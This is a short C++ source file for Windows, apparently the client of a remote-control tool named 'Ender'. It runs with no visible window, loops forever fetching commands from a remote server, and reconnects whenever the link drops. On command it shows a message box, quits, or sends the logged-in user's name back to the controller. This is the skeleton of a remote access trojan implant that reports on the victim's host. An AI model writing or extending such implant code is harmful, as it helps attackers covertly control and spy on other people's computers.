#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <Windows.h>
#include <WS2tcpip.h>
#include "client.h"
#include "main.h"

#pragma comment (lib, "Ws2_32.lib")

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
{
	init_winsock();
	CLIENT client;
	string command;
	while(true)
	{
		command.assign("");
		if(client.recieve_command(command) == false)
		{
			client.connect_to_server();
		}
		handle_command(client,command);
		Sleep(100);
	}
	return 0;
}

int init_winsock()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	return 0;
}

void handle_command(CLIENT& client, string& command)
{
	if(command.substr(0,5) == "show ")
	{
		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK);
	}
	else if(command == "disconnect")
	{
		ExitProcess(0);
	}
	else if(command == "username")
	{
		send_username(client);
	}
}

void send_username(CLIENT& client) // TODO: Needs some polishing
{
	char *uname = new char[500];
	DWORD user_len = 500;
	GetUserNameA(uname, &user_len);
	string resp;
	resp.assign(uname);
	client.send_response(resp);
	delete[] uname;
}